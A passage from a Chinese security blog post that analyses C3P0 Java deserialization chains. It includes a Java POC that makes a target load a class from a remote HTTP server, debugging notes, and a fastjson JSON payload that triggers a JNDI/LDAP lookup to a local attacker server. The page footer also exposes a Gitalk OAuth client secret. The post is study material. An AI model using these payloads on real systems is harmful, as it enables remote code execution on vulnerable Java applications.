class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ref;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="调试一下"><a href="#调试一下" class="headerlink" title="调试一下"></a>调试一下</h3><p><img src="E:\blog_back\source_posts\CB链\image-20260528195259529.png" alt="image-20260528195259529"></p>
+<p>传入的成员对象要继承这2个接口</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528195323453.png" alt="image-20260528195323453"></p>
+<p>这个方法还得实现一下</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528195400032.png" alt="image-20260528195400032"></p>
+<p>断点打在writeObject上面</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528195443542.png" alt="image-20260528195443542"></p>
+<p>刚刚传入的对象没法序列化 所以进入下面的语句中</p>
+<p>实例化一个ReferenceIndirector对象 并调用indirectForm并传入connectionPoolDataSource成员</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528195623241.png" alt="image-20260528195623241"></p>
+<p>刚刚实现了<strong>getReference方法</strong> 现在的引用对象ref有这些内容 都是后面远程类加载需要的</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528195741498.png" alt="image-20260528195741498"></p>
+<p>实例化内部类ReferenceSerialized</p>
+<p>现在来到<strong>readobject方法</strong></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528195833889.png" alt="image-20260528195833889"></p>
+<p>进入getObject方法</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528195857726.png" alt="image-20260528195857726"></p>
+<p>进入ReferenceableUtils.referenceToObject方法</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528195931476.png" alt="image-20260528195931476"></p>
+<p>上面是获取远程类的一些基本信息 下面开始加载这个远程类</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528200031196.png" alt="image-20260528200031196"></p>
+<p>远程的这个地方收到请求</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528200100881.png" alt="image-20260528200100881"></p>
+<p>成功加载并初始化</p>
+<p>由于这里是调用forName方法 会触发类的静态方法 所以这里直接就会弹了 </p>
+<hr>
+<p>这条链子一个触发类就成了</p>
+<p>并且也只要传入一个对象 其他的都是内部调用还是太权威了 出不过不出网就没法利用了</p>
+<hr>
+<h2 id="C3P0-jndi"><a href="#C3P0-jndi" class="headerlink" title="C3P0 jndi"></a>C3P0 jndi</h2><p>这个工具包支持jndi 所以很多地方都有jndi的影子</p>
+<p>这个链子打fastjson解析反序列化 或者是fastjson原生反序列化</p>
+<h3 id="核心类-1"><a href="#核心类-1" class="headerlink" title="核心类"></a>核心类</h3><ol>
+<li>JndiRefConnectionPoolDataSource</li>
+<li>WrapperConnectionPoolDataSource</li>
+<li>JndiRefDataSourceBase</li>
+<li>JndiRefForwardingDataSource</li>
+</ol>
+<h3 id="JndiRefConnectionPoolDataSource"><a href="#JndiRefConnectionPoolDataSource" class="headerlink" title="JndiRefConnectionPoolDataSource"></a>JndiRefConnectionPoolDataSource</h3><p>这个类名字就和jndi连接有关</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528202310663.png" alt="image-20260528202310663"></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528202350126.png" alt="image-20260528202350126"></p>
+<p>跟进一下这个方法</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528202412739.png" alt="image-20260528202412739"></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528202621859.png" alt="image-20260528202621859"></p>
+<p>会获得一个成员变量如何调用getLoginTimeout方法</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528202652369.png" alt="image-20260528202652369"></p>
+<p>我们先转到调试的时候的这个类</p>
+<p>跟进inner方法</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528202735429.png" alt="image-20260528202735429"></p>
+<p>进入dereference方法</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528202801219.png" alt="image-20260528202801219"></p>
+<p>获取jndi地址 然后lookup 可以打jndi </p>
+<p>看看jndiname怎么控制</p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528202908642.png" alt="image-20260528202908642"></p>
+<p>调用的getJndiName来自JndiRefDataSourceBase类</p>
+<p>JndiRefConnectionPoolDataSource这个类里面有这个成员对象 JndiRefForwardingDataSource</p>
+<p>JndiRefForwardingDataSource继承了JndiRefDataSourceBase类</p>
+<p> <img src="E:\blog_back\source_posts\CB链\image-20260528203235360.png" alt="image-20260528203235360"></p>
+<p><img src="E:\blog_back\source_posts\CB链\image-20260528203331817.png" alt="image-20260528203331817"></p>
+<p>所以直接调用setJndiName就可以控制了</p>
+<hr>
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;JndiName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:4321/Calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;getLoginTimeout&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="C3P0-hex加载字节码"><a href="#C3P0-hex加载字节码" class="headerlink" title="C3P0 hex加载字节码"></a>C3P0 hex加载字节码</h2><h3 id="核心类-2"><a href="#核心类-2" class="headerlink" title="核心类"></a>核心类</h3><ol>
+<li>WrapperConnectionPoolDataSource</li>
+<li>WrapperConnectionPoolDataSourceBase.<strong>setUserOverridesAsString</strong></li>
+<li>VetoableChangeSupport.fireVetoableChange</li>
+<li>VetoableChangeSupport.fireVetoableChange</li>
+<li>WrapperConnectionPoolDataSource.vetoableChange</li>
+<li>C3P0ImplUtils.parseUserOverridesAsString</li>
+<li>SerializableUtils.fromByteArray( serBytes )</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/CC%E9%93%BE/" rel="tag" title="CC链">CC链</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/java/" rel="tag" title="java">java</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag" title="反序列化">反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E7%9F%A5%E8%AF%86/" rel="tag" title="知识">知识</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/covers/CB383AC6ACEE4AED3D216ADAAB3BFBCB.jpg" data-sizes="auto" alt="CB链" class="lazyload">
+        
+      
+      <a href="/2026/05/27/CB%E9%93%BE/" aria-label="后一篇: CB链"  title="后一篇: CB链"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          CB链
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">说些什么吧！</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="gitalk">
+              <span>gitalk</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment gitalk-comment" data-aos="fade-up"
+          id="gitalk-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2025-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      S@Ku_yA
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        82.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        06:20
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#C3P0%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">C3P0链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0"><span class="toc-number">1.1.</span> <span class="toc-text">C3P0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">依赖地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DataSource"><span class="toc-number">1.1.2.</span> <span class="toc-text">DataSource</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0-URLClassLoader%E8%BF%9C%E7%A8%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">C3P0 URLClassLoader远程类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%B1%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">核心类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PoolBackedDataSourceBase"><span class="toc-number">1.2.2.</span> <span class="toc-text">PoolBackedDataSourceBase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">1.2.3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E4%B8%80%E4%B8%8B"><span class="toc-number">1.2.4.</span> <span class="toc-text">调试一下</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0-jndi"><span class="toc-number">1.3.</span> <span class="toc-text">C3P0 jndi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%B1%BB-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">核心类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiRefConnectionPoolDataSource"><span class="toc-number">1.3.2.</span> <span class="toc-text">JndiRefConnectionPoolDataSource</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3P0-hex%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">1.4.</span> <span class="toc-text">C3P0 hex加载字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E7%B1%BB-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">核心类</span></a></li></ol></li></ol></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">48</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">10</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">29</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "S@Ku_yA",
+          title: "C3P0链",
+          url: "http://example.com/2026/05/28/C3P0%E9%93%BE/",
+          excerpt: "",
+          description: "",
+          stripContent: "C3P0链C3P0早期的数据库连接池工具包 控制管理数据库连接 避免重复多次创建销毁连接  创建一次数据源 就可以直接多次使用 依赖地址12345&amp;lt;dependency&amp;gt;    &amp;lt;groupId&amp;gt;com.mchange&amp;lt;/groupId&amp;gt;    &amp;lt;artifactId&amp;gt;c3p0&amp;lt;/artifactId&amp;gt;    &amp;lt;version&amp;gt;0.9.5.2&amp;lt;/version&amp;gt;&amp;lt;/dependency&amp;gt;  DataS",
+          date: "Thu May 28 2026 18:18:54 GMT+0800",
+          updated: "Thu May 28 2026 21:44:55 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["gitalk"];
+  var commentConfig = {
+    
+    
+    
+    
+    gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.min.js',
+          'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU/lcEH5O8eVbSDhbPwsiVUTp/aGX/z/5EuMA'
+        );
+
+        script.onload = () => {
+          if (false) {
+            const md5Script = loadScript(
+              'https://npm.webcache.cn/blueimp-md5@2.19.0/js/md5.min.js',
+              'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr/gZlbkHkL6vTthxH'
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            initGitalk();
+          }
+        }
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          var gitalkId = location.pathname;
+          var gitalk = new Gitalk({
+            clientID: 'Ov23li1mTMN9Ccjmkh5p',
+            clientSecret: 'ea6c17281ea880a0862ad92a2aec900906d054f0',
+            repo: 'my_blog',
+            owner: 'sakuya-sys',
+            admin: ["sakuya-sys"],
+            id: gitalkId,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          })
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },
+    
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
